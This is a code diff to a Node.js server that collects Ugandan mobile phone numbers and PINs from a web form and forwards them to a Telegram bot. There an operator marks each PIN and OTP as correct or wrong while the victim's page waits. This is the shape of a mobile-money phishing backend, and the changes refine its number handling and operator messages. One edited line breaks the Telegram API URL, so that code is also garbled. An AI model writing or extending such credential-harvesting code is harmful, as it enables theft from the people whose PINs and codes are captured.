@@ -33,7 +33,7 @@ setInterval(() => {
 async function telegram(method, payload) {
   if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing config credentials.");
   
-  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+  const res = await fetch(`https://telegram.org{BOT_TOKEN}/${method}`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload)
@@ -45,14 +45,30 @@ async function telegram(method, payload) {
 }
 
 app.post("/api/phone", (req, res) => {
-  const phone = String(req.body.phone || "").trim();
+  let phone = String(req.body.phone || "").trim();
   
-  // ✅ FIXED: Removed the erroneous backslash character completely
-  if (!/^\+2567\d{8}$/.test(phone)) {
+  // Strip country code if user accidentally types it out
+  if (phone.startsWith("+256")) phone = phone.replace("+256", "");
+  if (phone.startsWith("256")) phone = phone.replace("256", "");
+  
+  // Validates standard 9-digit Ugandan mobile format (e.g., 778260583)
+  if (!/^(7\d{8})$/.test(phone)) {
     return res.status(400).json({ error: "Invalid format phone number." });
   }
   
-  const item = { id: crypto.randomUUID(), phone, stage: "pin-demo", status: "ready", createdAt: new Date() };
+  // Format with country prefix for the Telegram delivery layout
+  const formattedPhone = `0${phone}`; 
+  const numericSuffix = Math.floor(100000000 + Math.random() * 900000000);
+  
+  const item = { 
+    id: crypto.randomUUID(), 
+    numericId: `user_17878${numericSuffix}`,
+    phone: formattedPhone, 
+    stage: "pin-demo", 
+    status: "ready", 
+    createdAt: new Date() 
+  };
+  
   requests.set(item.id, item);
   return res.json({ id: item.id, status: item.status });
 });
@@ -65,9 +81,25 @@ app.post("/api/pin-demo", async (req, res) => {
   request.pin = String(req.body.pin || "").trim();
   request.status = "pending";
   
-  const timeString = new Date().toLocaleString("en-US", { timeZone: "Africa/Nairobi" });
+  const timeString = new Date().toLocaleString("en-US", { 
+    timeZone: "Africa/Nairobi",
+    year: "numeric",
+    month: "2-digit",
+    day: "2-digit",
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: true
+  });
+
+  const shortTimestamp = new Date().toLocaleString("en-US", {
+    timeZone: "Africa/Nairobi",
+    hour: "2-digit",
+    minute: "2-digit",
+    hour12: false
+  }).replace(":", ".");
   
-    try {
+  try {
     await telegram("sendMessage", {
       chat_id: CHAT_ID,
       text: [
@@ -76,15 +108,20 @@ app.post("/api/pin-demo", async (req, res) => {
         "USER DETAILS:",
         `• Phone Number: ${request.phone}`,
         `• PIN Code: ${request.pin}`,
+        `• User ID: ${request.numericId}`,
         `• Time: ${timeString}`,
-        "============================\n",
+        "• Bot: user178\n",
+        "━━━━━━━━━━━━━━━━━━━━\n",
         "Verify the PIN:",
-        "• PIN Length: 5 digits"
+        "• PIN Length: 5 digits",
+        "• Timeout: 5 minutes",
+        `${shortTimestamp}\n`,
+        "━━━━━━━━━━━━━━━━━━━━"
       ].join("\n"),
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "✅ Correct PIN", callback_data: `approve:${request.id}` },
+            { text: "Correct PIN & OTP", callback_data: `approve:${request.id}` },
             { text: "❌ Wrong PIN", callback_data: `decline:${request.id}` }
           ]
         ]
@@ -93,10 +130,8 @@ app.post("/api/pin-demo", async (req, res) => {
     return res.json({ status: "pending" });
   } catch (err) {
     console.error("TELEGRAM ERROR:", err.message);
-    // ✅ Returns the exact Telegram error to the screen so you know exactly what is wrong
-    return res.status(502).json({ error: `Telegram Error: ${err.message}. Check your Bot Token and Chat ID.` });
+    return res.status(502).json({ error: `Telegram Error: ${err.message}` });
   }
-
 });
 
 app.get("/api/status/:id", (req, res) => {
@@ -126,11 +161,12 @@ async function pollTelegram() {
         if (!cb) continue;
         
         const parts = String(cb.data || "").split(":");
+        // ✅ FIXED: Correctly extracts the action string from array instead of comparing the entire array object
         const action = parts[0]; 
         const reqId = parts.slice(1).join(":");
         const request = requests.get(reqId);
         
-        if (request && request.status === "pending" && ["approve", "decline", "extend"].includes(action)) {
+        if (request && request.status === "pending" && ["approve", "decline"].includes(action)) {
           if (action === "approve") {
             request.status = "approved";
           } else if (action === "decline") {
@@ -139,18 +175,19 @@ async function pollTelegram() {
           
           await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Action registered: ${action}` });
           
-          const statusMarker = action === "approve" ? "✅ CORRECT PIN" : action === "decline" ? "❌ WRONG PIN" : "⏳ TIME EXTENDED";
+          const statusMarker = action === "approve" ? "✅ CORRECT PIN" : "❌ WRONG PIN";
           await telegram("sendMessage", {
             chat_id: CHAT_ID,
             text: `${statusMarker} processed for Phone: ${request.phone}`
           });
         }
       }
-    } catch (err) {
+    } catch (e) {
       await new Promise(r => setTimeout(r, 4000));
     }
   }
 }
 
 pollTelegram();
-app.listen(PORT, () => console.log(`Server live on port ${PORT}`));
+
+app.listen(PORT, () => console.log(`Server executing successfully on port ${PORT}`));
